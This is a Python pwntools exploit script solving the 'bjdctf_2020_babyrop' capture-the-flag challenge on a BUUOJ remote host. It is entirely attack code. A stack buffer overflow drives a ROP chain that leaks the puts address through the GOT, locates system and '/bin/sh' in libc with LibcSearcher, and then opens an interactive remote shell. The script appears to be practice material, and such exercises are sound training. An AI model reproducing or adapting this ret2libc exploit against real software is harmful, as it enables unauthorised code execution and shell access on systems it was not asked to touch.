from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
elf = ELF('./bjdctf_2020_babyrop')
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi_ret = 0x00400733

main = 0x004006ad

#conn = process('./2018_rop')
#gdb.attach(conn, 'b *0x08048496')
conn = remote('node4.buuoj.cn', 28449)

conn.recvuntil(b'story!\n')
payload = b'a' * (0x20 + 0x8)
payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
conn.sendline(payload)
res = conn.recvline()
leak_addr = u64(res[:-1].ljust(0x8, b'\x00'))
print(f'leak_addr: {hex(leak_addr)}')

libc = LibcSearcher('puts', leak_addr)
libc_base = leak_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
exit = libc_base + libc.dump('exit')

conn.recvuntil(b'story!\n')
payload = b'a' * (0x20 + 0x8) + p64(pop_rdi_ret) + p64(binsh) + p64(system)
conn.sendline(payload)
#conn.recv()
conn.interactive()

